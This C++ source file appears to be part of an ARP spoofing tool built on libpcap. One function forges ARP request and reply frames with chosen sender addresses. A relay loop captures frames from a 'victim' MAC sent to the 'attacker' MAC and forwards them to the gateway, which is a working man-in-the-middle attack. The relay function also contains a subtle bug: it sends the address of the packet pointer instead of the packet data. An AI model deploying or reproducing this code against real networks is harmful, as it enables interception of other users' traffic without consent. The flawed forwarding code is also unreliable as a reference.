#pragma once
#include "pch.h"
int request(const char *dev, pcap_t *pcap, u_int8_t *dest_mac, u_int8_t *source_mac, u_int8_t *sender_mac, u_int8_t *sender_ip, u_int8_t *target_mac, u_int8_t *target_ip, int type)
{
    EthArpPacket packet;

    copy_mac(dest_mac, packet.eth_.dmac_);
    copy_mac(source_mac, packet.eth_.smac_);
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = 6;
    packet.arp_.pln_ = 4;
    if (type == 0)
    {
        packet.arp_.op_ = htons(ArpHdr::Request);
    }
    else if (type == 1)
    {
        packet.arp_.op_ = htons(ArpHdr::Reply);
    }
    else
    {
        printf("case 0 is sending request, case 1 is sending reply\n");
        return -1;
    }
    copy_mac(sender_mac, packet.arp_.smac_);
    copy_ip(sender_ip, packet.arp_.sip);
    copy_mac(target_mac, packet.arp_.tmac_);
    copy_ip(target_ip, packet.arp_.tip);
    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));
    if (res != 0)
    {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
        return -1;
    }
    return 0;
}

int reply(const char *dev, pcap_t *pcap, u_int8_t *mac)
{
    struct pcap_pkthdr *header;
    const u_char *packet;
    int res = pcap_next_ex(pcap, &header, &packet);
    if (res != 1)
    {
        printf("error!\n");
        return -1;
    }
    EthArpPacket *arppkt;
    arppkt = (EthArpPacket *)packet;
    if (arppkt->eth_.type_ == htons(EthHdr::Arp))
    {
        if (arppkt->arp_.pro_ == htons(EthHdr::Ip4))
        {
            print_mac(arppkt->arp_.smac_);
        }
    }
    copy_mac(arppkt->arp_.smac_, mac);
    return 0;
}

int relay(const char *dev, pcap_t *pcap, u_int8_t *attacker_mac, u_int8_t *victim_mac, u_int8_t *gate_mac)
{
    while (true)
    {
        struct pcap_pkthdr *header;
        const u_char *packet;
        int res = pcap_next_ex(pcap, &header, &packet);
        EthArpPacket *pkt;
        pkt = (EthArpPacket *)packet;
        if (res == 0)
            continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
        {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
            break;
        }

        if (if_same_mac(pkt->eth_.smac_, victim_mac))
        {
            if (if_same_mac(pkt->eth_.dmac_, attacker_mac))
            {
                printf("%u bytes captured. Actual length: %u\n", header->caplen, header->len); //헤더에서 캡쳐된 패킷 크기 가져와서 출력
                if (pkt->eth_.type_ == htons(EthHdr::Arp))
                {
                }
                else
                {
                    copy_mac(gate_mac, pkt->eth_.dmac_);
                    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char *>(&packet), header->len);
                    if (res != 0)
                    {
                        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
                        return -1;
                    }
                    printf("sent !\n");
                }
            }
        }
    }
    return 0;
}
